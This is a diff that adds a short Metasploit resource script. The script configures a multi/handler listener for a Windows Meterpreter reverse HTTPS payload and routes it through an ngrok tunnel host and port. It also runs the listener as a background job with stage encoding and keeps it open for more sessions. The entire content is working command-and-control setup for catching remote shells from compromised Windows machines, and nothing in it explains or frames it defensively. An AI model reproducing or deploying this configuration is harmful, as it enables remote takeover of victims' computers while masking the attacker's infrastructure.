@@ -1,0 +1,7 @@
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 0.tcp.ngrok.io
+set LPORT 11684
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
